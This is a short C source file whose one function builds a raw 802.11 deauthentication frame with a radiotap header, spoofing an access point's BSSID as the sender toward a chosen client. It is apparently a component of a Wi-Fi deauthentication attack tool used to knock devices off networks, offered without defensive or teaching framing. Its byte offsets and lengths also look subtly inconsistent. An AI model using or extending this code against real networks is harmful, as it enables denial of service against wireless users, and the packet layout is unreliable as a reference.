#include "deauth.h"

struct packet* create_deauth_frame(byte bssid[6], byte dst[6]) {
    struct packet* _packet = (struct packet*)malloc(sizeof(struct packet));
    struct iee_802_11_hdr wifi_hdr;
    struct iee_802_11_radio_tap radio_tap;
    
    wifi_hdr.frame_control = htons(0xc000);
    memcpy(wifi_hdr.ap,bssid,6);
    memcpy(wifi_hdr.dst,dst,6);
    memcpy(wifi_hdr.src,wifi_hdr.ap,6);
    wifi_hdr.duration = 450;
    wifi_hdr.seq_ctrl = 0;


    radio_tap.version = 0;
    radio_tap.pad = 0;
    radio_tap.present = 0x00008004;
    radio_tap.len = 12;
    radio_tap.data_rate = 2;

    _packet->len = sizeof wifi_hdr + sizeof radio_tap + 5;
    _packet->data = malloc(_packet->len + 2);

    _packet->data[_packet->len - 2] = 3;
    _packet->data[_packet->len - 1] = 0;

    memcpy(_packet->data,&radio_tap,sizeof(struct iee_802_11_radio_tap));
    _packet->data[sizeof(struct iee_802_11_radio_tap)] = 0;
    _packet->data[sizeof(struct iee_802_11_radio_tap) + 1] = 0x18;
    _packet->data[sizeof(struct iee_802_11_radio_tap) + 2] = 0;
    memcpy(_packet->data + sizeof(struct iee_802_11_radio_tap) + 3,&wifi_hdr, sizeof(struct iee_802_11_hdr));



    return _packet;
}